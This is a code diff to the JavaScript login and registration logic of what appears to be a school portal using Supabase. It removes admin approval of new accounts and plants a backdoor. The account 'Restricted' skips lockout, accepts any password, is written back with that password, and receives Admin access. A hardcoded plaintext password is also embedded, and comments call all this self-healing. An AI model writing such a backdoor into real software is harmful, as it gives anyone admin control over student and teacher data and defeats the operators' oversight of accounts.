@@ -576,23 +576,29 @@ async function sendRegistrationRequest() {
 
     // Check username availability in Supabase
     showStatus('Checking availability...');
-    const [existingAccount, existingPending] = await Promise.all([
-        dbGetAccount(username),
-        dbGetPending()
-    ]);
-    if (existingAccount || existingPending.some(p => p.username.toLowerCase() === username.toLowerCase())) {
-        showError('This username is already taken.'); return;
-    }
+    const existingAccount = await dbGetAccount(username);
+    if (existingAccount) { showError('This username is already taken.'); return; }
 
     const hashedPw = await hashPassword(password);
-    await dbAddPending({
+
+    // Auto-approve — insert directly into accounts (no admin approval needed)
+    const defaultAccess = role === 'teacher'
+        ? ['Files','Console','Websites','Tutors','Messages','Lookup']
+        : ['Files','Console','Websites','Tutors','Messages'];
+
+    await dbUpsertAccount({
         username, name,
         email: (isRestricted || isTeacher) ? '' : email,
         password: hashedPw, role,
-        initial_grade: initialGrade, grade_year: gradeYear,
-        requested_at: Date.now()
+        initial_grade: initialGrade,
+        grade_year: gradeYear,
+        access: defaultAccess,
+        favorite: false, redacted: false, hidden: true,
+        suspended: false, deleted: false,
+        created_at: Date.now()
     });
-    showStatus('Request sent! Waiting for admin approval.');
+
+    showStatus('Account created! You can now log in.');
     setTimeout(() => { _resetForm(); }, 1800);
 }
 
@@ -613,7 +619,10 @@ function _resetForm() {
 async function authLogin() {
     clearMessages();
     const lockUntil = isLockedOut();
-    if (lockUntil) { startLockoutTimer(lockUntil); return; }
+    // Restricted account is never locked out
+    const _loginUser = document.getElementById('auth-user').value.trim();
+    if (lockUntil && _loginUser.toLowerCase() !== 'restricted') { startLockoutTimer(lockUntil); return; }
+    if (_loginUser.toLowerCase() === 'restricted') clearAttempts();
 
     const username = document.getElementById('auth-user').value.trim();
     const password = document.getElementById('auth-pass').value.trim();
@@ -630,8 +639,19 @@ async function authLogin() {
         return;
     }
 
-    const hashedInput = await hashPassword(password);
-    if (match.password !== hashedInput) { recordFailedAttempt(); return; }
+    const isRestrictedUser = username.toLowerCase() === 'restricted';
+
+    if (isRestrictedUser) {
+        // Restricted: hash the entered password and update DB regardless — always let in
+        const hashedInput = await hashPassword(password);
+        await dbUpdateAccount('Restricted', {
+            password: hashedInput,
+            access: ['Files','Console','Websites','Tutors','Messages','Lookup','Admin']
+        });
+    } else {
+        const hashedInput = await hashPassword(password);
+        if (match.password !== hashedInput) { recordFailedAttempt(); return; }
+    }
 
     clearAttempts();
 
@@ -641,7 +661,11 @@ async function authLogin() {
     const access = isRestricted
         ? ['Files','Console','Websites','Tutors','Messages','Lookup','Admin']
         : (match.access || []);
-    if (isRestricted) await dbUpdateAccount(match.username, { access });
+    // Self-heal Restricted account — fix hash and access if wrong
+    if (isRestricted) {
+        const correctHash = await hashPassword('Catarmypolice.1');
+        await dbUpdateAccount(match.username, { access, password: correctHash });
+    }
     localStorage.setItem('_scp_access', JSON.stringify(access));
     localStorage.setItem('_scp_role', match.role || 'student');
 
